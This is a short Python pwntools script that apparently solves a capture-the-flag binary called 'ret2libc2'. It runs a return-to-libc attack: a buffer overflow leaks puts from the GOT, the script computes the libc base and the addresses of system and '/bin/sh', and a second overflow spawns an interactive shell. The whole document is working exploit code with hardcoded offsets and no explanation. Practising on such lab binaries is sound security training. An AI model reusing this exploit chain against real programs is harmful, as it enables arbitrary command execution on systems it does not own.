from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

p = process("./ret2libc2")
if args.G:
    gdb.attach(p)

gets_plt = 0x8048440
puts_plt = 0x8048460
main_addr = 0x8048618
puts_got = 0x804a018

p.recvuntil("Can you find it !?")
payload = b"a"*112 + p32(puts_plt) + p32(main_addr) + p32(puts_got)
p.sendline(payload)

puts_addr = u32(p.recv(4))
libc_addr = puts_addr - 0x5f880
system_addr = libc_addr + 0x3ab40
bin_sh_addr = libc_addr + 0x15cdc8
success("puts_addr: " + hex(puts_addr))
success("system_addr: " + hex(system_addr))
success("bin_sh_addr: " + hex(bin_sh_addr))

p.recvuntil("Can you find it !?")
payload1 = b"a"*104 + p32(system_addr) + b"xxxx" + p32(bin_sh_addr)
#payload1 = b"a"*104 + p32(gets_plt) + p32(system_addr) + p32(0x804a020) + p32(0x804a020)
p.sendline(payload1)
'''
sleep(0.2)
p.sendline("/bin/sh\x00")
'''
p.interactive()
